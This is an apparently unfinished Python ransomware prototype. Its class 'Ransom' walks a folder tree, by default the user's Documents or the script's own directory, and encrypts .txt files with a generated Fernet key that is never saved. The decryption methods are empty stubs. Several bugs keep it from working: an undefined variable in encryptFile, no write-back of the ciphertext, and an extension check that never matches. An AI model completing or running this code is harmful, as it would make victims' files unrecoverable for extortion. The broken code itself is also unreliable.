
from cryptography.fernet import Fernet 
import os
import getpass

class Ransom:

    def __init__(self, key = None, targets = None, root = None):
        # TOdO
        if key != None:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        self.targets = ['.txt']
        if root == None:
            self.root = '~/Documents/'
        else:
            self.root = root

    def encrypt(self):
        for root, dirs, files in os.walk(self.root, topdown=False):
            for file in files:
                filePath = os.path.join(root, file)
                if filePath.split('.')[-1] in self.targets:
                    self.encryptFile(filePath)
            #for name in dirs:
               # print(os.path.join(root, name))

    def encryptFile(self, file):
        with open(file_path, 'rb+') as f:
            content = f.read()
            content = self.fernet.encrypt(content)
    

    def decryptDirectory(self, dir):
        for file in dir:
            pass
            # DEcrypt file
        for d in dir:
            pass
            # DEcrypt directory recursive
        pass
    def decryptFile(self, file):
        # TOdo
        pass
    

def main():
    ransom = Ransom()
    path = os.path.realpath('ransom.py')
    parts = path.split('/')

    parts = parts[:-1]
    path = '/'.join(parts)
    print(path)
    #doc_index = parts.index('Documents')
    #path = '/'.join(parts[:doc_index+1])
    #print(path)
    ransom = Ransom(root = path)
    ransom.encrypt()
    

if __name__ == '__main__':
    main()

    

        

    